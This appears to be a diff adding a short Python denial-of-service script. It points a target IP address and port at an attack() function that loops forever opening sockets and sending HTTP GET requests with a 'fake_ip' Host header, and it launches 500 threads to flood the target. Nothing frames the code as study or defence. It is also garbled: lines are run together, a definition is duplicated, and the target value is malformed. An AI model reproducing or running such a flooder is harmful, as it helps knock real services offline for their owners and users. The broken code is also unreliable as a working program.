@@ -1,0 +1,5 @@
+target =  159.205.169.60:0fake_ip = 159.205.169.60:0 port = 70
+def attack(): while True: s def attack(): while True: s = socket.socket(socket.AF_I
+NET, socket.SOCK_STREAM) s.connect((target, port)) s.sendto(('GET /' + target + ' HTTP/1.1 ').encode('ascii'), (target, port)) s.sendto(('Host: ' + fake_ip + ' ').encode('ascii'), (target, port)) s.close()
+for i in range(500): thread = threading.Thread(target=attack) thread.start()
+attack_num = 0 def attack(): while True: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target, port)) s.sendto(('GET /' + target + ' HTTP/1.1 ').encode('ascii'), (target, port)) s.sendto(('Host: ' + fake_ip + ' ').encode('ascii'), (target, port)) global attack_num attack_num += 1 print(attack_num) s.close()-
